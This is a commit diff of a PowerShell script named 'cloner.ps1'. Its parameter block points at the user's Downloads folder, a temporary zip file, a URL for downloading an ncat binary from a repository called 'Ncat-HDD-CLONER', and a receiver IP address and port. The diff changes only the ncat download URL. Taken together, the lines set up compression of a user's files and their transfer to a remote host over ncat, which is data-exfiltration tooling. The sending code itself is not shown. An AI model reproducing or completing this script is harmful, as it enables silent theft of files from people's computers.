b2314d2ac4f07c31dd7947e2b384f738f013b9a6
josh green <bcsjoshgreen25@gmail.com>
2024-06-03 00:29:07 +0300

    Update Downloads:cloner.ps1

--- Downloads:cloner.ps1
+++ Downloads:cloner.ps1
@@ -1,7 +1,7 @@
 # Parameters
 $downloadsFolder = "$env:USERPROFILE\Downloads"
 $zipFilePath = "$env:TEMP\Downloads.zip"
-$ncatUrl = "https://github.com/cyberisltd/NcatPortable/blob/master/ncat.exe"  # URL to download ncat
+$ncatUrl = "https://github.com/gr33n37/Ncat-HDD-CLONER/blob/main/nc.exe"  # URL to download ncat
 $ncatPath = "$env:TEMP\ncat.exe"  # Path to save downloaded ncat
 $targetIP = "192.168.43.102"  # Update this to the receiver's IP address
 $targetPort = 12345
